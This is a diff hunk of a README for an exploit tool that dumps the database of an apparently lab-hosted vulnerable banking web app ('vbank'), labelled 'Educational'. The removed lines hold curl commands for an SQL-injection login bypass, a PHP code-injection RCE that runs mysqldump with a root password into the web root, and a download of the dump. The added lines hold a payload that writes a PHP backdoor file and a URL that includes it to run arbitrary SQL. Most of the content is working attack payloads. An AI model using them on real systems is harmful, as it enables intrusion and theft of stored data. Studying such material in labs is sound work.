@@ -324,21 +324,11 @@ python3 db_dump_exploit.py --method 3 --format json
 
 ### Manual Dump (Educational)
 ```bash
-# Step 1: Authenticate
-curl -c cookies.txt -G "http://localhost/index.php" \
-  --data-urlencode "page=login" \
-  --data-urlencode "username=' OR '1'='1" \
-  --data-urlencode "password=x"
+1. Drop Bridge: 
+   query=test'.(file_put_contents('/tmp/bridge.php', '<?php ... ?>')).'
 
-# Step 2: Trigger RCE
-curl -b cookies.txt -G "http://localhost/index.php" \
-  --data-urlencode "page=htbdetails" \
-  --data-urlencode "account=252170513" \
-  --data-urlencode "query=\" . system('mysqldump -u root -paaa vbank > /var/www/html/vbank_dump.sql') . \""
-
-# Step 3: Download
-sleep 2
-curl "http://localhost/vbank_dump.sql" -o vbank_dump.sql
+2. Use Bridge:
+   http://localhost/index.php?page=htbdetails&account=252170513&query=test'.(include('/tmp/bridge.php')).'&q=SELECT * FROM users
 ```
 
 ### Verify Dump
